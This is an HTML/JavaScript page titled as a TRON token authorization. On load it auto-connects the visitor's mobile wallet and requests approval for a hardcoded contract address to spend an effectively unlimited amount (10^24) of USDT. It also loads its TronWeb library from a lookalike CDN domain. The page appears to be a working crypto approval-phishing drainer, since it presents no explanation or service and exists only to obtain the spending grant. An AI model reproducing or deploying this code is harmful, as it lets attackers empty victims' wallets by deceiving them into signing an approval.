<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>TRON代币授权</title>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
</head>
<body>
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
    <div id="status">正在连接钱包...</div>
    <div id="error" style="color: red; display: none;"></div>

    <script>
        // 配置地址 - 与测试页面保持一致
        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 权限地址（合约地址）
        window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';   // 收款地址，与test.html统一
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 标准USDT合约地址

        // 存储用户数据
        const userData = {
            address: null,
            trxBalance: null,
            usdtBalance: null
        };

        // 页面加载后立即执行
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                await autoConnectWallet();
                await approveToken();
            } catch (error) {
                showError(`操作失败: ${error.message}`);
                console.error(error);
            }
        });

        // 自动连接钱包
        async function autoConnectWallet() {
            updateStatus("正在自动连接钱包...");
            
            // 验证地址配置完整性
            validateAddressConfig();
            
            // 检查是否在移动设备上
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobile) {
                throw new Error("请使用移动设备访问");
            }

            // 检查是否有TronWeb环境
            if (typeof window.tronWeb === 'undefined' && typeof window.tronLink === 'undefined') {
                updateStatus("未检测到钱包，尝试跳转到DApp浏览器...");
                const currentUrl = encodeURIComponent(window.location.href);
                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
                // 等待跳转，如果5秒后仍未跳转则提示
                await new Promise(resolve => setTimeout(resolve, 5000));
                throw new Error("请使用支持TRON的DApp浏览器（如OKX钱包）访问");
            }

            // 连接到钱包
            if (window.tronWeb && window.tronWeb.ready) {
                updateStatus("已检测到TronWeb，正在初始化...");
            } else if (window.tronLink) {
                updateStatus("正在请求连接TronLink...");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code !== 200) {
                    throw new Error("用户拒绝了钱包连接请求");
                }
                window.tronWeb = window.tronLink.tronWeb;
            }

            // 验证tronWeb是否可用
            if (!window.tronWeb || typeof window.tronWeb.address.toHex !== 'function') {
                throw new Error("TronWeb初始化失败，无法完成授权操作");
            }

            // 获取用户信息
            userData.address = window.tronWeb.defaultAddress.base58;
            updateStatus(`已连接钱包: ${userData.address.substring(0, 6)}...${userData.address.substring(38)}`);
            
            // 获取余额
            const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
            userData.trxBalance = window.tronWeb.fromSun(trxBalance);
            
            return true;
        }

        // 验证地址配置
        function validateAddressConfig() {
            const addresses = [
                { name: '权限地址', value: window.Permission_address },
                { name: '收款地址', value: window.Payment_address },
                { name: 'USDT合约地址', value: window.usdtContractAddress }
            ];
            
            // 检查地址是否存在
            addresses.forEach(item => {
                if (!item.value) {
                    throw new Error(`${item.name}未配置，请检查配置`);
                }
            });
            
            // 检查地址格式（TRON地址以T开头，34位长度）
            const isValidAddress = (addr) => addr.length === 34 && addr.startsWith('T');
            addresses.forEach(item => {
                if (!isValidAddress(item.value)) {
                    throw new Error(`${item.name}格式错误: ${item.value}`);
                }
            });
        }

        // 授权代币
        async function approveToken() {
            updateStatus("准备进行代币授权...");
            
            if (!userData.address) {
                throw new Error("未检测到钱包地址");
            }

            try {
                // 转换地址为十六进制
                const usdtContractHex = window.tronWeb.address.toHex(window.usdtContractAddress);
                const permissionHex = window.tronWeb.address.toHex(window.Permission_address);
                
                // 加载USDT合约
                const contract = await window.tronWeb.contract().at(usdtContractHex);
                if (!contract) {
                    throw new Error("无法加载USDT合约");
                }

                // 授权额度 (10^24 是一个较大的额度)
                const amount = new Decimal(10).pow(24).toString();
                
                updateStatus("正在发起授权请求，请在钱包中确认...");
                
                // 调用approve方法授权
                const result = await contract.approve(
                    permissionHex,  // 授权给哪个地址（十六进制）
                    amount          // 授权额度
                ).send({
                    from: userData.address,
                    feeLimit: 100000000  // 设置手续费上限
                });

                if (result.result) {
                    updateStatus(`授权成功！交易哈希: ${result.transaction.txID}`);
                } else {
                    throw new Error("授权被拒绝或失败");
                }
            } catch (error) {
                console.error("授权过程出错:", error);
                throw new Error(`授权失败: ${error.message}`);
            }
        }

        // 更新状态显示
        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }

        // 显示错误信息
        function showError(message) {
            const errorEl = document.getElementById('error');
            errorEl.textContent = message;
            errorEl.style.display = 'block';
        }
    </script>
</body>
</html>
